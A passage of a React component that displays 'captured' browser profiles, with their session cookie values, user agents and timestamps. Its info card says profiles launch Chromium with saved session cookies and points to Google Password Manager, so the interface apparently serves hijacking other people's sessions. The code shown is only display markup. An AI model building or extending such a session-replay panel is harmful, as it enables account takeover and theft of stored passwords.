                            <td style={{ padding: '6px 8px', fontFamily: 'monospace', color: 'rgba(226, 232, 240, 0.4)', overflow: 'hidden', textOverflow: 'ellipsis', maxWidth: '120px' }} title={cookie.value}>
                              {(cookie.value || '').substring(0, 40)}{(cookie.value || '').length > 40 ? '...' : ''}
                            </td>
                            <td style={{ padding: '6px 8px', color: 'rgba(226, 232, 240, 0.5)' }}>{cookie.domain}</td>
                            <td style={{ padding: '6px 8px', color: 'rgba(226, 232, 240, 0.5)' }}>
                              {cookie.expirationDate ? new Date(cookie.expirationDate * 1000).toLocaleDateString() : 'Session'}
                            </td>
                          </tr>
                        ))}
                      </tbody>
                    </table>
                  </div>
                </div>
              )}

              {selectedProfile.userAgent && (
                <div>
                  <label style={{ display: 'block', fontSize: '14px', fontWeight: 500, color: 'rgba(226, 232, 240, 0.5)', marginBottom: '8px' }}>User Agent</label>
                  <div style={{ padding: '8px 12px', backgroundColor: '#0C0E14', border: '1px solid rgba(255, 255, 255, 0.1)', borderRadius: '8px', color: 'rgba(226, 232, 240, 0.7)', fontSize: '12px', fontFamily: 'monospace', wordBreak: 'break-all' }}>
                    {selectedProfile.userAgent}
                  </div>
                </div>
              )}

              {/* Timestamps */}
              <div>
                <label style={{ display: 'block', fontSize: '14px', fontWeight: 500, color: 'rgba(226, 232, 240, 0.5)', marginBottom: '8px' }}>Timestamps</label>
                <div style={{ display: 'flex', flexDirection: 'column', gap: '8px', fontSize: '14px' }}>
                  <div style={{ display: 'flex', justifyContent: 'space-between', padding: '8px 12px', backgroundColor: '#0C0E14', border: '1px solid rgba(255, 255, 255, 0.1)', borderRadius: '8px' }}>
                    <span style={{ color: 'rgba(226, 232, 240, 0.5)' }}>Captured</span>
                    <span style={{ color: '#E2E8F0' }}>{formatDistanceToNow(new Date(selectedProfile.createdAt), { addSuffix: true })}</span>
                  </div>
                  {selectedProfile.lastLaunchedAt && (
                    <div style={{ display: 'flex', justifyContent: 'space-between', padding: '8px 12px', backgroundColor: '#0C0E14', border: '1px solid rgba(255, 255, 255, 0.1)', borderRadius: '8px' }}>
                      <span style={{ color: 'rgba(226, 232, 240, 0.5)' }}>Last Launched</span>
                      <span style={{ color: '#E2E8F0' }}>{formatDistanceToNow(new Date(selectedProfile.lastLaunchedAt), { addSuffix: true })}</span>
                    </div>
                  )}
                </div>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* Info Card */}
      <div style={{ borderRadius: '12px', border: '1px solid rgba(79, 127, 255, 0.2)', backgroundColor: 'rgba(79, 127, 255, 0.1)', padding: '16px' }}>
        <div style={{ display: 'flex', gap: '12px' }}>
          <Activity style={{ height: '20px', width: '20px', color: '#4F7FFF', flexShrink: 0, marginTop: '2px' }} />
          <div style={{ fontSize: '14px', color: 'rgba(226, 232, 240, 0.7)', display: 'flex', flexDirection: 'column', gap: '4px' }}>
            <p style={{ fontWeight: 500, color: '#E2E8F0' }}>Profile Launch Information:</p>
            <ul style={{ listStyle: 'disc', paddingLeft: '20px', display: 'flex', flexDirection: 'column', gap: '2px', color: 'rgba(226, 232, 240, 0.6)' }}>
              <li>Maximum 5 profiles can be launched concurrently</li>
              <li>Launched profiles open Chromium with saved session cookies</li>
              <li>Access Google Password Manager at passwords.google.com</li>
              <li>Sessions auto-close after 30 minutes of inactivity</li>
            </ul>
          </div>
        </div>
      </div>

      {/* Delete Confirmation Modal */}
      {confirmDelete && (
        <div style={{ position: 'fixed', inset: 0, backgroundColor: 'rgba(0, 0, 0, 0.6)', backdropFilter: 'blur(8px)', display: 'flex', alignItems: 'center', justifyContent: 'center', zIndex: 9999 }} onClick={() => setConfirmDelete(null)}>
          <div style={{ backgroundColor: '#1A1D2E', border: '1px solid rgba(255, 255, 255, 0.1)', borderRadius: '12px', padding: '24px', maxWidth: '28rem', width: '100%', margin: '0 16px', boxShadow: '0 25px 50px -12px rgba(0, 0, 0, 0.25)' }} onClick={(e) => e.stopPropagation()}>
            <div style={{ display: 'flex', alignItems: 'flex-start', gap: '16px' }}>
              <div style={{ flexShrink: 0, width: '48px', height: '48px', borderRadius: '50%', backgroundColor: 'rgba(239, 68, 68, 0.1)', border: '1px solid rgba(239, 68, 68, 0.2)', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
                <Trash2 style={{ width: '24px', height: '24px', color: '#EF4444' }} />
              </div>
              <div style={{ flex: 1 }}>
                <h3 style={{ fontSize: '18px', fontWeight: 600, color: '#E2E8F0', marginBottom: '8px' }}>Delete {confirmDelete.type === 'bulk' ? 'Profiles' : 'Profile'}?</h3>
                <p style={{ fontSize: '14px', color: 'rgba(226, 232, 240, 0.6)', marginBottom: '16px' }}>
                  {confirmDelete.type === 'bulk' 
                    ? `Are you sure you want to permanently delete ${confirmDelete.count} selected profiles? This will remove all data from the database.`
                    : 'Are you sure you want to permanently delete this profile? This will remove all data from the database.'}
                </p>
                <p style={{ fontSize: '12px', color: '#EF4444', fontWeight: 500, marginBottom: '24px' }}>⚠️ This action cannot be undone.</p>
                <div style={{ display: 'flex', gap: '12px' }}>
                  <button
                    onClick={() => setConfirmDelete(null)}
                    style={{ flex: 1, padding: '10px 16px', backgroundColor: 'rgba(255, 255, 255, 0.05)', border: '1px solid rgba(255, 255, 255, 0.1)', color: '#E2E8F0', borderRadius: '8px', fontSize: '14px', fontWeight: 500, cursor: 'pointer', transition: 'background-color 0.2s' }}
                    onMouseEnter={e => (e.currentTarget.style.backgroundColor = 'rgba(255, 255, 255, 0.1)')}
                    onMouseLeave={e => (e.currentTarget.style.backgroundColor = 'rgba(255, 255, 255, 0.05)')}
                  >
                    Cancel
                  </button>
                  <button
                    onClick={confirmDeleteAction}
                    style={{ flex: 1, padding: '10px 16px', backgroundColor: '#EF4444', color: '#FFFFFF', borderRadius: '8px', fontSize: '14px', fontWeight: 500, cursor: 'pointer', border: 'none', transition: 'background-color 0.2s' }}
                    onMouseEnter={e => (e.currentTarget.style.backgroundColor = '#DC2626')}
                    onMouseLeave={e => (e.currentTarget.style.backgroundColor = '#EF4444')}
                  >
                    Delete {confirmDelete.type === 'bulk' ? 'All' : ''}
                  </button>
                </div>
              </div>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
